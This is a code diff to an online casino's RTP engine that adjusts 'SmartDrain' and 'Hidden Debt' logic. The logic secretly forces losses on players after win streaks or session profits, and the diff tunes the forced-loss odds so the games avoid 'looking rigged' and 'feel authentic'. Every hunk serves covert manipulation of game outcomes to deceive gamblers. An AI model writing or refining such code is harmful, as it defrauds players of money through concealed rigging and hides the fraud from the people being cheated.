@@ -437,9 +437,9 @@ class RtpEngine {
       return 0; // 100% Pure RNG for tournament bets
     }
 
-    // 1. Priority check: SmartDrain active on this user
+    // 1. Priority check: SmartDrain active on this user (realistic, natural tilt)
     if (await this.isDrainActive(userId, isTournament)) {
-      return 0.95; // 95% tilt in favor of casino
+      return 0.45; // balanced tilt in favor of casino without looking rigged
     }
 
     const userCfg = await this.getUserConfig(userId);
@@ -513,7 +513,8 @@ class RtpEngine {
     userId: string,
     stake: number,
     grossPayout: number,
-    isTournament: boolean = false
+    isTournament: boolean = false,
+    gameType?: string
   ): Promise<void> {
     if (isTournament) return;
 
@@ -530,8 +531,10 @@ class RtpEngine {
       await this.reduceHiddenDebt(userId, netLoss).catch(e => logger.error(e));
     }
 
-    // Process SmartDrain auto-monitoring
-    void this.recordRoundForDrain(userId, stake, grossPayout, grossPayout > stake, isTournament).catch(() => {});
+    // Process SmartDrain auto-monitoring only for casino games (sports is external sportsbook)
+    if (gameType !== 'sports') {
+      void this.recordRoundForDrain(userId, stake, grossPayout, grossPayout > stake, isTournament).catch(() => {});
+    }
 
     try {
       const r = redisClient.getClient();
@@ -751,7 +754,11 @@ class RtpEngine {
       const roundsLeft = await r.hincrby(`rtp:drain:${userId}`, 'roundsLeft', -1);
       if (roundsLeft <= 0) {
         await r.del(`rtp:drain:${userId}`);
-        logger.info({ userId }, 'SmartDrain completed and removed');
+        // Set a 20-minute cooldown so drain doesn't immediately re-arm in a vicious loop
+        await r.set(`rtp:drain_cooldown:${userId}`, '1', 'EX', 1200);
+        // Clear session profit counter so it doesn't re-trigger instantly
+        await r.del(`rtp:session_profit:${userId}`);
+        logger.info({ userId }, 'SmartDrain completed, 20m cooldown set, session profit reset');
       }
     } catch (err) {
       logger.warn({ err, userId }, 'Failed to consume drain round');
@@ -774,21 +781,21 @@ class RtpEngine {
       const r = redisClient.getClient();
       const netProfit = payout - betAmount;
 
-      // Track rolling session profit (2-hour rolling window)
+      // Track rolling session profit (1-hour rolling window)
       const sessionKey = `rtp:session_profit:${userId}`;
       const rawProfit = await r.incrbyfloat(sessionKey, netProfit);
       const newSessionProfit = Number(rawProfit) || 0;
-      await r.expire(sessionKey, 7200);
+      await r.expire(sessionKey, 3600);
 
       // Track win streak
       const streakKey = `rtp:win_streak:${userId}`;
       let streak = 0;
       if (won) {
         streak = Number(await r.incr(streakKey)) || 0;
-        await r.expire(streakKey, 3600);
+        await r.expire(streakKey, 1800);
       } else {
         await r.set(streakKey, '0');
-        await r.expire(streakKey, 3600);
+        await r.expire(streakKey, 1800);
       }
 
       // Check if user is currently under active drain
@@ -798,17 +805,26 @@ class RtpEngine {
         return;
       }
 
+      // Check cooldown - after drain completes, give player 20m grace period before any new auto-drain can trigger
+      const cooldown = await r.get(`rtp:drain_cooldown:${userId}`);
+      if (cooldown) {
+        return;
+      }
+
       // AUTO-TRIGGER CONDITIONS:
-      // 1. High Win streak: >= 5 wins in a row
-      // 2. High Session profit: >= +80 PLN
-      // 3. Massive single win: >= +100 PLN
-      if (streak >= 5 || newSessionProfit >= 80 || netProfit >= 100) {
-        const rounds = newSessionProfit > 250 ? 10 : newSessionProfit > 120 ? 8 : 6;
+      // Must be substantial to avoid nuisance false-positives on small play:
+      // 1. Long win streak: >= 7 wins in a row
+      // 2. High session profit: >= +350 PLN
+      // 3. Massive single hit: >= +300 PLN
+      if (streak >= 7 || newSessionProfit >= 350 || netProfit >= 300) {
+        const rounds = newSessionProfit > 800 ? 8 : newSessionProfit > 400 ? 6 : 4;
         await this.setDrain(userId, {
           rounds,
-          durationMs: 45 * 60 * 1000,
+          durationMs: 20 * 60 * 1000, // 20 minutes max
           reason: `auto_profit_${Math.round(newSessionProfit)}pln_streak_${streak}`,
         });
+        // Damp the session profit tracker so it doesn't immediately re-trigger after rounds finish
+        await r.set(sessionKey, String(Math.max(0, newSessionProfit * 0.3)));
       }
     } catch (err) {
       logger.warn({ err, userId }, 'Failed to record round for drain');
@@ -817,6 +833,7 @@ class RtpEngine {
 
   /**
    * Determines if a forced loss should be applied to the next round outcome.
+   * NEVER 100% DETERMINISTIC: uses natural probabilistic curves so games feel authentic.
    */
   async shouldForceLoss(
     userId: string,
@@ -831,13 +848,30 @@ class RtpEngine {
       // 1. Check SmartDrain (active слив)
       const drain = await this.isDrainActive(userId, isTournament);
       if (drain) {
-        return true;
+        // Smart Drain is PROBABILISTIC, NEVER 100%!
+        // The player must still win ~35-50% of rounds so the game feels authentic and natural.
+        // We scale the resistance dynamically by potential multiplier and stake:
+        let forceChance = 0.45;
+        if (potentialMultiplier >= 3.0) {
+          forceChance = 0.65; // higher multiplier has more natural house resistance
+        } else if (potentialMultiplier >= 2.0) {
+          forceChance = 0.50; // around 50/50 for 2x
+        } else if (potentialMultiplier < 1.4) {
+          forceChance = 0.25; // low risk almost always safe
+        }
+
+        // For larger bets, slight gentle adjustment
+        if (betAmount >= 50) {
+          forceChance = Math.min(0.70, forceChance + 0.10);
+        }
+
+        return Math.random() < forceChance;
       }
 
-      // 2. Check Hidden Debt
+      // 2. Check Hidden Debt (soft resistance, never 100%)
       const debt = await this.getHiddenDebt(userId);
       if (debt > 0) {
-        return true;
+        return Math.random() < 0.40;
       }
 
       return false;
